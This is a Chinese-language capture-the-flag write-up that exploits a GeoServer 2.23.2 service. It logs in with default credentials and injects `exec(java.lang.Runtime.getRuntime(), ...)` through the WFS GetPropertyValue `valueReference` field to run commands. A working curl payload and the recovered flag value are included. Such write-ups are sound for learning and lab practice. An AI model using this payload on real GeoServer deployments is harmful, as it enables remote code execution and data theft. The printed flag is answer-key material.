## 题目原文

> 请对目标地理数据服务进行安全测试与漏洞挖掘。

## 题解

### 入口与指纹

服务在 8080，路径是 `/geoserver/`。用题目环境里常见的 `admin` / `geoserver` 读 `/geoserver/rest/about/version.json`，版本是 GeoServer `2.23.2`。另外还开着 5005，这次没有用到。

### 关键观察

`POST /geoserver/wfs` 的 `GetPropertyValue` 会把 `valueReference` 当成表达式执行。`exec(java.lang.Runtime.getRuntime(), '...')` 会启动进程。响应本身是 `ClassCastException`，因为返回值不是属性描述符，但命令已经跑完。

### 利用链

让 WFS 把 flag 复制到数据目录的 www 下面，再直接读取：

```bash
T=$(head -1 .target)
curl -sS -H 'Content-Type: application/xml' \
  --data '<wfs:GetPropertyValue service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0" valueReference="exec(java.lang.Runtime.getRuntime(),'"'"'cp /challenge/flag.txt /mnt/geoserver/data_dir/www/flag.txt'"'"')"><wfs:Query typeNames="sf:archsites"/></wfs:GetPropertyValue>' \
  "http://$T/geoserver/wfs"
curl -sS "http://$T/geoserver/www/flag.txt"
```

本次正文是 `flag{c349f75c-9170-4e57-b309-f1a8f957b465}`。平台接受。

### flag 位置

复制之后在 `/geoserver/www/flag.txt`。原文件是容器里的 `/challenge/flag.txt`。
